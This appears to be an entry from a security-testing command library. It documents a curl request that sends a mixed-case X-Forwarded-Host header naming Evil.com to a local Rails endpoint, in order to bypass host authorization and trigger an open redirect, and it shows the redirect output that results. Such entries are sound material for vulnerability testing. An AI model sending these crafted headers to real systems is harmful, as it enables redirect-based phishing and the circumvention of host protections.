---
id: uuid-curl-mixed
data: 'curl ''http://localhost:3000/tests'' -H ''X-Forwarded-Host: Evil.com'''
tags:
  - http-test
  - header-bypass
  - open-redirect
type: command
output: >-
  <html><body>You are being <a
  href="http://Evil.com/">redirected</a>.</body></html>
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:09.614Z'
verified: false
validated: true
submitted: true
---
# curl-mixed-case-x-forwarded-host

## Command

```bash
curl 'http://localhost:3000/tests' -H 'X-Forwarded-Host: Evil.com'
```

## Description

Sends a GET request to a Rails /tests endpoint with a mixed-case X-Forwarded-Host header to bypass host authorization and trigger an open redirect. Use this to test the vulnerability in local setups.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL (e.g., 'http://localhost:3000/tests') | Target endpoint for the request | Yes |
| -H 'X-Forwarded-Host: Evil.com' | Crafted header with mixed case to cause nil parsing | Yes |

## Examples

### Basic Usage

```bash
curl 'http://localhost:3000/tests' -H 'X-Forwarded-Host: Evil.com'
```

### Advanced Usage (Follow Redirect)

```bash
curl -L 'http://localhost:3000/tests' -H 'X-Forwarded-Host: Evil.com' -v
```

## Expected Output

HTML indicating redirect: <html><body>You are being <a href="http://Evil.com/">redirected</a>.</body></html>. Verbose mode (-v) shows Location header pointing to the malicious host.

## Related

- [[commands/curl-uppercase-x-forwarded-host]]
- [[procedures/Exploit-Open-Redirect-with-Mixed-Case-X-Forwarded-Host]]
